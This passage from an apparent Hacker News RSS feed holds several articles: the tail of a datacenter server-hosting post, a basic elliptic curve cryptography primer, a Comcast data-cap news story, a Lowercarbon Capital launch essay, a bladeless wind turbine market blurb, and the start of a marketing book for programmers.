Foundry.</figcaption></figure><p>When I installed my server at the datacenter, it went something like this:</p><ol><li>I purchased a plan from the website.</li><li>The datacenter provided me network information over email, including a static IPv4 block, which I used to configure my server's network.</li><li>Using support tickets, we scheduled a time to install the server.</li><li>On that day, I drove to the datacenter and parked. I sent a text message to the provided phone number and a technician came outside. We wheeled my server in on a cart, through some doors, into the rack area.</li><li>The technician installed my server on the rack and connected it to the network.</li><li>I made final changes and tested that I could access my server from outside.</li><li>That's it! Voil√†, you're in a datacenter.</li></ol><p>While this may seem daunting, it is a necessary next step for freedom online. I hope that more people will follow this path of running their ‚Ä¶</p></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.alexgleason.me/run-your-own-server/">https://blog.alexgleason.me/run-your-own-server/</a></em></p>]]>
            </description>
            <link>https://blog.alexgleason.me/run-your-own-server/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26134691</guid>
            <pubDate>Sun, 14 Feb 2021 18:20:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[(Very) Basic Intro to Elliptic Curve Cryptography]]>
            </title>
            <description>
<![CDATA[
Score 203 | Comments 39 (<a href="https://news.ycombinator.com/item?id=26134240">thread link</a>) | @wagslane
<br/>
February 14, 2021 | https://qvault.io/2020/09/17/very-basic-intro-to-elliptic-curve-cryptography/ | <a href="https://web.archive.org/web/*/https://qvault.io/2020/09/17/very-basic-intro-to-elliptic-curve-cryptography/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
<p>Elliptic curve cryptography is a modern <a aria-label=" (opens in a new tab)" href="https://searchsecurity.techtarget.com/definition/public-key" target="_blank" rel="noreferrer noopener nofollow">public-key&nbsp;encryption&nbsp;</a>technique based on mathematical elliptic curves and is well-known for creating smaller, faster, and more efficient cryptographic keys. For example, <a aria-label=" (opens in a new tab)" href="https://bitcoin.org/" rel="noreferrer noopener nofollow" target="_blank">Bitcoin</a> uses ECC as its asymmetric cryptosystem because of its lightweight nature.</p>
<p>In this introduction to ECC, I want to focus on the high-level ideas that make <a aria-label="ECC (opens in a new tab)" rel="noreferrer noopener nofollow" href="https://en.wikipedia.org/wiki/Elliptic-curve_cryptography" target="_blank">ECC</a> work. For the purposes of keeping this article easier to digest, I‚Äôll omit implementation details and mathematical proofs, we can save those for another time.</p>
<h2>What is elliptic curve cryptography used&nbsp;for?</h2>
<p>A common use of ECC is to encrypt data so that only authorized parties can decrypt it. This has several obvious use cases but is most often used to encrypt internet traffic. For example, on the <a href="https://qvault.io/">Qvault web app</a> I could used ECC to encrypt a verification email so that no one but the recipient can read the message.</p>
<h2>ECC is public-key cryptography</h2>
<p>There are many types of public-key cryptography, and Elliptic Curve Cryptography is just one flavor. Other algorithms include <a aria-label="RSA (opens in a new tab)" rel="noreferrer noopener nofollow" href="https://en.wikipedia.org/wiki/RSA_(cryptosystem)" target="_blank">RSA</a>, <a aria-label="Diffie-Helman (opens in a new tab)" rel="noreferrer noopener nofollow" href="https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange" target="_blank">Diffie-Helman</a>, etc. Let‚Äôs go over a quick background of public-key cryptography as a jumping-off point, so that I can discuss ECC and build on top of these ideas. By all means, study more in-depth on public-key cryptography when you have the time.</p>
<p>Public-key cryptography allows the following to happen:</p>

<p>We create two keys, a public key, and a private key. The public key is given freely, and any party can encrypt data by using it. However, the private key is kept secret and only those who hold it will have the ability to decrypt data.</p>
<h2>An example of public-key cryptography</h2>
<p>Let‚Äôs pretend that Facebook is going to receive a private post from Donald Trump. Facebook needs to be able to ensure that when the ex-president sends his post over the internet, no one in the middle (Like the NSA, or an internet service provider) can read the message. The entire exchange using public-key cryptography would go like this:</p>
<ul><li>Donald Trump Notifies Facebook that he wants to send them a private post</li><li>Facebook sends Donald Trump their public key</li><li>Donald Trump uses the public key to encrypt his post:</li></ul>
<p><em>‚ÄúI love Fox and Friends‚Äù + Public Key = ‚Äús80s1s9sadjds9s‚Äù</em></p>
<ul><li>Donald Trump sends only the encrypted message to Facebook</li><li>Facebook uses its private key to decrypt the message:</li></ul>
<p><em>‚Äús80s1s9sadjds9s‚Äù + Private Key = ‚ÄúI love Fox and Friends‚Äù</em></p>
<p>As you can see, this form of encryption can be quite useful. Here are some key points:</p>
<ul><li>The public key can safely be sent to anyone. It‚Äôs public.</li><li>The private key must be kept safe because if someone in the middle were to get the private key, they could decrypt messages.</li><li>Computers can quickly use the public key to encrypt a message, and quickly use the private key to decrypt a message.</li><li>Computers require a <em>very</em> long time (millions of years) to derive the original data from the encrypted message if they don‚Äôt have the private key.</li></ul>
<h2>How it Works: The Trapdoor&nbsp;Function</h2>
<p>The crux of all public-key cryptographic algorithms is that they each have their own unique trapdoor function<strong>. </strong>A trapdoor function is a function that can only be computed one way, or at least can only be computed one way <em>easily</em> (in less than millions of years using modern computers).</p>
<h3>Not a trapdoor function:</h3>
<p><code>A + B = C</code></p>
<p>If I‚Äôm given A and B I can compute C. However, if I‚Äôm given B and C I can also compute A. This is not a trapdoor function.</p>
<h3>Trapdoor function:</h3>
<p><code>"I love Fox and Friends‚Äù + Public Key --&gt; s80s1s9sadjds9s</code></p>
<p>If given <em>‚ÄúI love Fox and Friends‚Äù</em> and the public key, I can produce <code>s80s1s9sadjds9s</code>, but if given <code>s80s1s9sadjds9s</code> and the Public Key I can‚Äôt produce <em>‚ÄúI love Fox and Friends‚Äù</em></p>
<p>In RSA, which is arguably the most widely used public-key cryptosystem, the trapdoor function relies on how hard it is to factor large numbers into their prime factors.</p>
<p><strong>Public Key:</strong> <code>944,871,836,856,449,473</code></p>
<p><strong>Private Key:</strong> <code>961,748,941</code> and <code>982,451,653</code></p>
<p>In the example above the public key is a very large number, and the private key is the two prime factors of the public key. This is a good example of a Trapdoor Function because it is very easy to multiply the numbers in the private key together to get the public key, but if all you have is the public key it will take a very long time using a computer to re-create the private key.</p>
<p><em>Note: In real cryptography, the private key would need to be 200+ digits long to be considered secure.</em></p>
<h2>What Makes Elliptic Curve Cryptography Different?</h2>
<p>You would use ECC for the same reasons as RSA. ECC and RSA both generate a public and private key and allow two parties to communicate securely. One advantage to ECC however, is that a 256-bit key in ECC offers about the same security as a 3072-bit key using RSA. ECC allows resource-constrained systems like smartphones, embedded computers, and cryptocurrency networks to use ~10% of the storage space and bandwidth required by RSA.</p>
<h2>ECC‚Äôs Trapdoor&nbsp;Function</h2>
<p>This is probably why most of you are here. The trapdoor function is what makes ECC special and different than RSA. The trapdoor function is similar to a mathematical game of pool.</p>
<p>First, we start with an arbitrary point on the curve. Next, we use the dot function to find a new point. Finally, we keep repeating the dot function to hop around the curve until we finally end up at our last point. Let‚Äôs walk through the algorithm.</p>

<ul><li>Starting at <code>A</code>:</li><li><code>A dot B = -C</code> (Draw a line from A to B and it intersects at -C)</li><li>Reflect across the X-axis from -C to C</li><li><code>A dot C = -D</code> (Draw a line from A to C and it intersects -D)</li><li>Reflect across the X-axis from -D to D</li><li><code>A dot D = -E</code> (Draw a line from A to D and it intersects -E)</li><li>Reflect across the X-axis from -E to E</li></ul>
<p>This is a great trapdoor function because if you know where the starting point (A) is and how many hops are required to get to the ending point (E), it‚Äôs very easy to find the ending point. On the other hand, if all you know is where the starting point and ending point are, it‚Äôs nearly impossible to find how many hops it took to get there.</p>
<p>Public Key: Starting Point A, Ending Point E</p>
<p>Private Key: Number of hops from A to E</p>
<h2>Questions?</h2>
<p>Here are a few questions I had when I first learned about ECC. Hopefully, I can address them properly.</p>
<h3>1. How is the second point found? If the dot function is basically drawing a line between two points, don‚Äôt you need a second point to start&nbsp;with?</h3>
<p>No. The second point (we will call it -R below) is actually the result of P dot P (let‚Äôs assume the first point is called P)</p>
<p><code>P dot P = -R</code></p>
<p>So what is <code>P dot P</code>? It is actually just the tangent line of P. See the graphic below:</p>

<h3>2. What happens if the dot function produces a line that will go way off out to some&nbsp;extreme?</h3>
<p>If the line doesn‚Äôt hit the curve close to the origin, we can actually define a maximum X value where the line will wrap back around and start from the beginning again. See the graphic below for an example.</p>

<h3>3. If the number of hops is the private key, can‚Äôt I just count the hops until I hit the endpoint?</h3>
<p>Nope! The number of hops is <em>very</em> large, something like <code>2^256</code>. It would take far too long to compute each hop one by one, for example <code>p dot p dot p dot p ...</code>.</p>
<p>If however, you know the number of hops you can use an <a href="https://en.wikipedia.org/wiki/Exponentiation_by_squaring" target="_blank" aria-label="exponentiation (opens in a new tab)" rel="noreferrer noopener nofollow">exponentiation</a> trick to find the ending point quite quickly. For example, and omitting the details of elliptic curve operations: <code>2P = P dot P</code> and then <code>4P = 2P dot 2P</code>. This allows you to get up to those crazy high calculations exponentially faster.</p>
<h2>Who Cares?</h2>
<p>ECC is used as the cryptographic key algorithm in Bitcoin because it potentially can save ~90% of the resources used by a similar RSA system. It seems that each year we see more systems moving from RSA to a more modern elliptic curve approach.</p>
<div><div>
<h2>Thanks For Reading!</h2>
<p>If you‚Äôre interested in furthering your CS career, take our <a href="https://qvault.io/">computer science courses</a></p>
<p>Follow and hit us up on Twitter <a href="https://twitter.com/q_vault" rel="noopener">@q_vault</a> if you have any questions or comments, and if we‚Äôve made a mistake be sure to <a href="https://qvault.io/contact/">let us know</a> so we can get it corrected!</p>
<p><a href="https://mailchi.mp/5c7f5c281bbe/qvault-newsletter-subscribe" rel="noopener">Subscribe</a> to our newsletter for more programming articles</p>
</div></div>
<h2>Related Articles</h2>
<ul><li><a href="https://qvault.io/2020/01/29/hashing-passwords-python-cryptography-examples/">Hashing Passwords ‚Äì Python Cryptography Examples</a></li><li><a href="https://qvault.io/2020/07/08/how-sha-2-works-step-by-step-sha-256/">How SHA-2 Works Step-By-Step (SHA-256)</a></li><li><a href="https://qvault.io/2019/07/09/is-aes-256-quantum-resistant/">Is AES-256 Quantum Resistant?</a></li></ul>
 </div></div>]]>
            </description>
            <link>https://qvault.io/2020/09/17/very-basic-intro-to-elliptic-curve-cryptography/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26134240</guid>
            <pubDate>Sun, 14 Feb 2021 17:33:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Comcast Backs Off Plan to Impose New Fees on Heavy-Duty Internet Users]]>
            </title>
            <description>
<![CDATA[
Score 25 | Comments 5 (<a href="https://news.ycombinator.com/item?id=26134040">thread link</a>) | @CapitalistCartr
<br/>
February 14, 2021 | https://jcitytimes.com/comcast-backs-off-plan-to-impose-new-fees-on-heavy-duty-internet-users/ | <a href="https://web.archive.org/web/*/https://jcitytimes.com/comcast-backs-off-plan-to-impose-new-fees-on-heavy-duty-internet-users/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div id="pico"><h3>Cable-company criticized for asking customers to pay more during public-health emergency, when high-speed internet is critical to students, some employees</h3><p><em>This story was written and produced by NJ Spotlight. It is being republished under a special NJ News Commons content-sharing agreement related to COVID-19 coverage. To read more, visit njspotlight.com.</em></p><p><em>Full story link ‚Äì <a href="https://www.njspotlight.com/2020/06/we-cant-unsee-racial-inequities-in-nj-made-clear-by-covid-19-whats-the-plan-to-address-them/" target="_blank" rel="noopener noreferrer">HERE</a>.</em></p><p data-autoattached="true">By Tom Johnson</p><p>Comcast is postponing until July its plan to impose new fees on customers who are heavy users of its internet services after widespread criticism for proposing to increase bills during a public-health emergency.</p><p>The postponement came after pressure from lawmakers and consumer advocates. They argued such a step was inappropriate at a time when many students and others are relying heavily on the internet because of the coronavirus pandemic. The cap on data use was effective Jan. 1 for Comcast customers in the Northeast region, including New Jersey,</p><p>In New Jersey, lawmakers have introduced legislation (<a href="https://bf1f7a75-24f0-4a30-89f1-4410f141a906/v" target="_blank" rel="noopener">S-3410</a>) that would prevent internet service providers from increasing rates during a public-health emergency. In Pennsylvania, the state‚Äôs attorney general‚Äôs office secured a commitment last week from Comcast, a Philadelphia-based cable company, to delay imposing the new fees on data usage to current customers there and throughout the Northeast.</p><p>The plan calls for a monthly data-usage cap of 1.2 terabytes. If customers exceed the data limit, they could be charged anywhere from $10 to $100 on top of their existing bills, depending on their data usage. Comcast began monitoring customers‚Äô data usage at the beginning of the year, but had held off imposing the fees until March.</p><h3>‚ÄòUnconscionable‚Äô to levy an extra fee</h3><p>‚ÄúDuring the COVID-19 pandemic, it is unconscionable for a cable company to levy an extra fee for using their internet,‚Äô‚Äô said Sen. Nicholas Scutari (D-Union), the sponsor of the bill in the New Jersey Legislature. ‚ÄúRight now people are relying on their home internet more than ever ‚Äî for work, for their children to attend school, to shop for groceries and to schedule COVID-19 testing and vaccinations.‚Äô‚Äô</p><p>The legislation, introduced a week ago, has not yet moved in either house of the Legislature.</p><p>In a news release, Comcast said it is delaying imposition of the new fees for six months to provide its customers in the Northeast time to familiarize themselves with the data-usage plan and their service options.</p><p>The company said the new limit on data usage only affects a ‚Äúvery small percentage of its customers.‚Äô‚Äô Comcast is also giving its low-income customers some help by doubling the speed for those who subscribe to its Internet Essentials service and not imposing data limits on that plan for the rest of the year. In addition, the company is waiving early termination fees for customers who do not want to be subject to caps on data usage.</p><p>In New Jersey, the state Board of Public Utilities has received some complaints from customers about the new fee but is unable to take action because it does not regulate internet service, according to Peter Peretzman, a spokesman for the agency. There are no plans to investigate the problem, he added.</p><p><em>Photo by <a href="https://unsplash.com/@nasa?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">NASA</a> on </em><a href="https://unsplash.com/s/photos/internet?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText"><em>Unsplash</em></a></p></div></div></div>]]>
            </description>
            <link>https://jcitytimes.com/comcast-backs-off-plan-to-impose-new-fees-on-heavy-duty-internet-users/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26134040</guid>
            <pubDate>Sun, 14 Feb 2021 17:13:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Chris Sacca's Act 2: Lowercarbon Capital]]>
            </title>
            <description>
<![CDATA[
Score 109 | Comments 51 (<a href="https://news.ycombinator.com/item?id=26133941">thread link</a>) | @simonebrunozzi
<br/>
February 14, 2021 | https://lowercarboncapital.com/act2/ | <a href="https://web.archive.org/web/*/https://lowercarboncapital.com/act2/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>
<div>
<div>
<div><figure><img loading="lazy" src="https://i0.wp.com/lowercarboncapital.com/wp-content/uploads/2021/02/leslie-cross-bWYTWRx9yRM-unsplash2-e1612971496415-edited-2.jpg?resize=1292%2C808&amp;ssl=1" alt="" width="1292" height="808" srcset="https://i0.wp.com/lowercarboncapital.com/wp-content/uploads/2021/02/leslie-cross-bWYTWRx9yRM-unsplash2-e1612971496415-edited-2.jpg?w=1723&amp;ssl=1 1723w, https://i0.wp.com/lowercarboncapital.com/wp-content/uploads/2021/02/leslie-cross-bWYTWRx9yRM-unsplash2-e1612971496415-edited-2.jpg?resize=300%2C188&amp;ssl=1 300w, https://i0.wp.com/lowercarboncapital.com/wp-content/uploads/2021/02/leslie-cross-bWYTWRx9yRM-unsplash2-e1612971496415-edited-2.jpg?resize=1024%2C640&amp;ssl=1 1024w, https://i0.wp.com/lowercarboncapital.com/wp-content/uploads/2021/02/leslie-cross-bWYTWRx9yRM-unsplash2-e1612971496415-edited-2.jpg?resize=768%2C480&amp;ssl=1 768w, https://i0.wp.com/lowercarboncapital.com/wp-content/uploads/2021/02/leslie-cross-bWYTWRx9yRM-unsplash2-e1612971496415-edited-2.jpg?resize=1536%2C960&amp;ssl=1 1536w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1"></figure></div>
</div>
</div>







<p><em>Because we‚Äôve run the numbers, and shit‚Äôs not great</em>.</p>







<p>Four years ago, Crystal and I retired from venture capital to carve out more time for things that matter, with Earth‚Äôs climate disaster at the top of the list. Why? The situation is much worse than it seems. The planet is warming faster than experts predicted. Rising temperatures fuel lethal heat waves, year-round fires, destructive storms, and epic droughts that are already killing thousands of people around the globe, displacing millions more, and sowing the seeds of famine, disease, and war. Heavy stuff.</p>



<p>Academic debates about exactly how many degrees the planet will warm, which species will go extinct, how many millions of people will be killed by extreme weather, which wars and refugee crises will result from drought, and whether sea levels will rise 10, 20, or 30 feet all miss the point. The bottom line is the planet is becoming unlivable. If you‚Äôre the quantitative type, well, we drew some samples, crunched a few numbers and, according to our exact scientific calculations: A lot of shit will be pretty fucked up.</p>



<p>In simplest terms, more carbon equals more heat, and more heat equals more death. This is an established and unavoidable fact. Today, the levels of CO<sub>2</sub> in the atmosphere are higher than at any point in at least 800,000 years (and arguably as far back as 23 million). Pumping all this CO<sub>2</sub> into the sky is like locking ourselves in a car on a sunny day.</p>







<h2><span>What will it take to get us out of this nightmare? </span></h2>



<p>Electric cars and solar panels are awesome but only a part of the picture. To bring down CO<sub>2</sub> in the atmosphere it will take:</p>



<blockquote><p><span><span>01</span></span>   Slashing new emissions of CO<sub>2</sub> and other greenhouse gases to zero.</p><p><span><span>02</span></span>   Sucking up at least a trillion tons of carbon already swirling around the sky.</p><p><span><span>03</span></span>   Buying all of humanity, including those most vulnerable, more time by actively cooling the planet.</p></blockquote>



<p>I am not new to this challenge. Way back when I was at Google, I was tasked with leading many of the company‚Äôs clean energy deals, repping execs in meetings with policy groups and think tanks, and exploring innovative ways to use technology to reduce the carbon footprint of a company that was, at the time, rumored to the be the largest individual power consumer in two or three US states. (If saying that violates my Google NDA, then no, we definitely weren‚Äôt a massive user of electrical power. Nothing to see here.)</p>



<p>In the years that followed, Crystal and I have been active supporters of legislative and regulatory efforts to address the problems, as well as funders of philanthropy and activism in the climate space. We‚Äôve been poking around academic labs, comparing notes with environmental non-profits, briefing political leaders, cajoling philanthropists, sponsoring research and primers, and advising companies concerned about the climate emergency.&nbsp;</p>



<p>After almost 20 years of this work, here is what we know to be true:</p>



<p><strong>Policy change alone ain‚Äôt gonna get us there.</strong> High fives to everyone who is working on clean tech regulatory initiatives. This vital work brings down real costs, creates research breakthroughs, and keeps urgent climate issues front and center. But even the most aggressive ideas on the table today fall short of the drastic action needed.&nbsp;</p>



<p><strong>Guilt and shame don‚Äôt and won‚Äôt change anything at scale. </strong>There simply aren‚Äôt enough people willing to buy more expensive products nor companies on board with overpaying for sustainable materials just because they feel bad. Cheers to consumers and companies that spend a little more to choose options with climate in mind. You‚Äôve undoubtedly helped create a new generation of climate friendly companies. However, we need about seven billion more of you to get on board before the impact will be meaningful enough.&nbsp;</p>



<p><strong>Philanthropy is way too small and cautious</strong>. For the better part of twenty years, climate philanthropy has been overwhelmingly focused on consumer awareness campaigns to persuade people that climate change is real and to turn out their lights. But there‚Äôs been too little appetite to invest in hardcore, massive change. Bless you and those paper straws, but unless we zero out the billions of tons of CO<sub>2</sub> emissions from huge sectors like aviation, steelmaking, industrial chemicals, building, and farming, we are screwed.</p>



<p>So, policy, philanthropy, and individual behavior do have roles to play, but the real solutions to the carbon nightmare will win because they‚Äôre cheaper, better, faster, stronger, simpler, and just plain cooler than what‚Äôs available today.&nbsp;</p>



<p>Markets already understand that it‚Äôs too damn expensive to keep powering our economy by digging up and burning old dinosaur bones. In most places today, solar and wind are cheaper and scale faster. What you might not know yet is that technologies that grow chemicals in bioreactors or boost crop yields are already outperforming 100-year-old industrial processes that are dirty and dangerous. We see this happening in protein, transportation, chemicals, building materials, and even mining too. This radical shift isn‚Äôt just because of some warm and fuzzies. These are real businesses, with insane growth, and some posting nine-figure revenue run rates.</p>



<p>We‚Äôre on a clear trajectory to 8.5 billion people on this planet. I‚Äôm going out on a limb and predict they‚Äôll want to eat, build houses, go places, buy stuff, and enjoy life. Fair to say? The most profitable companies meeting this demand will be those that sell products and services that use less carbon because they are ultimately the cheapest to offer. In simple terms, cutting gigatons of CO<sub>2</sub>, mass market adoption, and generating piles of money will go hand-in-hand.</p>







<h2><span>Who knew we would look forward to email?</span></h2>



<p>When the word got out that we were starting to dig into climate tech, our inboxes blew up. Notes came in from very small and unreasonably ambitious teams taking on intimidatingly large projects to slash CO<sub>2</sub> emissions and suck carbon right out of the air. Frankly, we‚Äôve never felt so energized reading our email. It was everything we loved about startups colliding with all of the urgency we felt for helping a planet on fire.&nbsp;</p>



<p>There is also a dynamic that makes climate tech today different from clean tech 15 years ago. It reminds me of the dramatic shift in startup economics that made YCombinator and its companies possible. Back then, the rise of open-source coding tools, cloud hosting, and the elimination of legal and financing friction empowered a new type of company and a new type of company-builder. The old way required millions of dollars and a rash of bankers and lawyers to even consider writing the first line of code. Suddenly startups had tiny, ragtag teams, usually without any fancy MBAs on board, raising tens to hundreds of thousands of dollars for services and apps that they built and launched within weeks.</p>



<p>In climate tech, we have seen the same evolution. I appreciate the investors who have been plowing money into this stuff for decades and I admire their passion and commitment to doing the right thing. But, too often low-carbon businesses were among the most expensive to start. CapEx was bonkers right out of the gate, and most companies relied upon government intervention to even approach viability.</p>



<p>Are we excited to see the Biden/Harris administration finally at the wheel? Hell yes. They believe in science and have made climate a priority across the entire federal government. We have the deepest respect for Secretary Kerry and Gina McCarthy, and we admire the depth of expertise and hustle we are seeing across the staffers accepting roles to serve the USA to advance climate work. As members of Climate Leaders for Biden, and as a consequence of our involvement across the industry, we have already been in close touch with the administration and we are beyond heartened to see how serious they are about climate. Multiple times, Crystal and I have spoken directly with President Biden about climate and I can assure you he gets the gravity and urgency of the moment. Yet, despite all that, we aren‚Äôt counting on the government‚Äôs direct help in our investment thesis. Why?</p>



<p>Today, with shared lab space, massive computing clusters available for rent, proliferation of machine learning, cheap renewable electricity, the discovery of CRISPR/Cas9, breakthroughs in electrochemistry, and more streamlined tech transfer from universities, true seed-stage climate tech startups are possible at scale. Some benefit from grants and government investment, and no doubt healthy public investment in research and science lifts all boats, but barely any of these climate tech companies count on governments for handouts because they increasingly can rely upon free markets to reward them with customers. Add to this what might be the first generation of hard science engineers who, inspired by a prior, similar shift in computer science academia, now go to school knowing from day one they want to graduate to directly become company founders. These teams are taking their innovations straight to consumers and enterprises who may not vote for the same people nor share the same climate values, but who buy their products and services because they are just simply cheaper and better.&nbsp;&nbsp;</p>







<h2><span>We call this thing Lowercarbon Capital.</span></h2>



<p>It wasn‚Äôt in the master plan to get back into the investing world full-time. But after a few years of doing this work, we picked up our heads and realized we now have a portfolio of over 30 climate teams and growing.&nbsp;</p>



<p>Our startups straddle a delicate line between, ‚ÄúWhaaa? That‚Äôs absolutely bananas!‚Äù to, ‚ÄúNo way. Are you f‚Äôing kidding me?!‚Äù You know, chill stuff like confining plasma that‚Äôs hotter than the sun or growing full-on real meat steaks in a vat. Maybe using microbes to make hundreds of millions of dollars of industrial chemicals is your thing, or you‚Äôre into kelp-growing robots in the high seas. I‚Äôm kinda partial to ‚Ä¶</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://lowercarboncapital.com/act2/">https://lowercarboncapital.com/act2/</a></em></p>]]>
            </description>
            <link>https://lowercarboncapital.com/act2/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26133941</guid>
            <pubDate>Sun, 14 Feb 2021 17:02:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Bladeless Wind Turbines]]>
            </title>
            <description>
<![CDATA[
Score 11 | Comments 2 (<a href="https://news.ycombinator.com/item?id=26133497">thread link</a>) | @kyleShropshire
<br/>
February 14, 2021 | https://www.evwind.es/2019/05/31/bladeless-wind-turbines-less-efficient-in-the-conversion-of-captured-wind-power-into-electrical-energy/67462 | <a href="https://web.archive.org/web/*/https://www.evwind.es/2019/05/31/bladeless-wind-turbines-less-efficient-in-the-conversion-of-captured-wind-power-into-electrical-energy/67462">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Wind is an essential part of the global 
renewable energy landscape and in the foreseeable future, the reliance 
on it is anticipated to increase. Currently, turbines are the most 
commonly used machines to convert wind energy into electrical energy 
with the movement of the blades fuelling an electricity generator. 
However, the top-heavy nature of conventional wind turbines requires 
high-quality components to avoid structural damage. This factor 
increases the cost of constructing the whole system. On the other hand, 
with the recent innovation of bladeless wind turbines, the risk of 
structural damage to the system can be reduced significantly. Bladeless 
wind turbines do not include rotating blades and are designed in such a 
way that they stand erect and oscillate in response to the vortices. The
reduced weight of these turbines is acting as a primary driver of the 
global bladeless wind turbines market.</p>
<p>The report offers insights into the 
drivers, restraints, and opportunities impacting the growth of the 
market. It calculates the competitive landscape of the market using 
analytical tools such as market attractiveness analysis and Porter‚Äôs 
five force analysis. It presents a holistic perspective of the market‚Äôs 
growth across various regions and product type in terms of revenue as 
well as volume.</p>
<p><strong>Read Report Overview @</strong></p>
<figure><p>
https://www.transparencymarketresearch.com/bladeless-wind-turbines-market.html
</p></figure>
<p><strong>Overview of the Global</strong>&nbsp;<strong>Bladeless Wind Turbines&nbsp;</strong><strong>Market</strong></p>
<p>Bladeless wind turbines contain only a 
few moving parts. They not only help in eliminating noise but also don‚Äôt
pose a threat to birds. This makes them more advanced than their 
earlier counterparts. Moreover, the lower cost of manufacturing and 
maintenance of these turbines is contributing to an increase in their 
demand. In addition to lower costs, these turbines do not suffer large 
drop in power. As a result, more bladeless wind turbines can be 
installed per unit area than conventional wind turbines. These factors, 
collectively, are propelling the growth of the global bladeless wind 
turbines market.</p>
<p>On the flip side, bladeless wind  turbines,&nbsp;being at a nascent stage, are less efficient in the conversion  of captured wind power into electrical energy, thus limiting their  implementation on a large scale. However, the manufacturing of bladeless  wind turbines using advanced technology&nbsp;and enhanced materials is  likely to boost the demand for these turbines in the forthcoming years.</p>
<p>
At present, the global bladeless wind turbine market is&nbsp;being propelled 
by the efforts of a Spanish company, Vortex Bladeless, which has 
innovated a contemporary design of bladeless turbines. With intensive 
ongoing research and product enhancements, more companies are expected 
to enter the market.
</p>

<p>On the basis of region, the global  bladeless wind turbines market is categorized into Western Europe,  Eastern Europe, Asia Pacific, Latin America, North America, and the  Middle East and Africa. The adoption of bladeless wind turbines is  expected to pick up speed in Western Europe owing to presence of  favorable environmental conditions and availability of advanced  technology. Asia Pacific is estimated to flourish due to increasing  government initiatives for promoting wind energy.</p>
</div></div>]]>
            </description>
            <link>https://www.evwind.es/2019/05/31/bladeless-wind-turbines-less-efficient-in-the-conversion-of-captured-wind-power-into-electrical-energy/67462</link>
            <guid isPermaLink="false">hacker-news-small-sites-26133497</guid>
            <pubDate>Sun, 14 Feb 2021 16:11:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Entreprenerd: Marketing for Programmers]]>
            </title>
            <description>
<![CDATA[
Score 17 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26133340">thread link</a>) | @athosblade
<br/>
February 14, 2021 | https://www.jackkinsella.ie/books/entreprenerd/marketing_for_programmers | <a href="https://web.archive.org/web/*/https://www.jackkinsella.ie/books/entreprenerd/marketing_for_programmers">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
        <div>
  <div>
    
    <h2>A Condensed Guide to Marketing Software</h2>
    <p><img src="https://www.jackkinsella.ie/assets/entreprenerd/entreprenerd-cover-ee444e819661ce962b44e840eddcf6505208a984b55209ef4ea0d97064a9ac91.jpg" alt="Entreprenerd cover"></p><p>Both the HTML version of the book and the luxury <a href="https://drive.google.com/drive/folders/0B36dwR68NHU3cHJaWWY2Y2E3bkk">Kindle/PDF</a> versions are free forever.</p>
    <h2>Introduction</h2>
    <p>
    In a fair world, meritocracy would rule. Being good at what you do would be all that's necessary to get fans, sales, custom, and acclaim.
    </p>

    <p>
    But we do not live in such a world; our reality is a crowded one, one where only those who shout the loudest get noticed.
    </p>

    <p>
    It is disconcerting to consider our own insignificance, but it is only by taking this perspective that we grasp the difficultly of entering the public√¢‚Ç¨‚Ñ¢s awareness.
    </p>

    <p>
    Given vast access to the machinery of the web and digital publishing, each of us is competing for attention with a billion others. Each of us has but one painting sitting in a gallery housing a thousand others, stationed in a city hosting a thousand such galleries, situated in a world with a thousand such cities. Leaving our painting√¢‚Ç¨‚Ñ¢s discovery to fate alone, our chances of being noticed are little better than those of winning the lotto.
    </p>

    <p>
    This state of affairs is hardly a new one. Charles Ives, considered by some to be the greatest American composer, ceased writing music 18 years before his death. For the remainder of his life, he dedicated himself to promoting and distributing his music. Without this gargantuan effort, it is doubtful that his work would have the acclaim it enjoys today.
    </p>

    <p>
    The ultimate goal of all marketing is to get ever-increasing, self-perpetuating word of mouth (or, to be more modern about it, "recommendation of Reddit" or "tweet of Twitter"). But this is a case of the rich getting richer, of attention begetting attention, of the virtuous circle in full swing. Because word of mouth only kicks in after the snowball is already hurtling down the slope, a more apt question is how to get the thing to budge in the first place.
    </p>

    <p>
    The approach outlined in this book is one possible answer to this question. In a nutshell, the strategy is as follows: You will take out online advertisements and invest in SEO so as to inform relevant members of the public that you exist. Thanks to the potency of these measures, a steady stream of promising leads will arrive to your website. Here, you will apply the psychological tactics of conversion optimisation and copywriting to convince these leads to place orders, download your music, or whatever it is you want them to do. Following their conversion, you will send these past customers automated emails and display remarketing ads so as to keep them coming back to you again and again. Meanwhile, throughout every stage of this process, you will study reports in Google Analytics to discover which particular marketing measures brought you the highest profits. So as not to be fooled by randomness, you will apply statistical significance testing, thereby ensuring that any confidence you have in your marketing conclusions is justified.
    </p>

    <p>
    I want to highlight that not all of your marketing forays will bear fruit. Indeed, most will fail. The reality is that you will need to try out lots of different angles until you find the one that sticks.
    </p>

    <p>
    And with that, let's dive in.
    </p>

    <h2>Table of Contents</h2>
    <ul>
      <li><a href="https://www.jackkinsella.ie/articles/seo-steps-to-take-before-writing-a-single-line-of-code">SEO Steps To Take Before Writing a Single Line of Code</a></li>
      <li><a href="https://www.jackkinsella.ie/articles/seo-on-each-individual-page">SEO on Each Individual Page</a> </li>
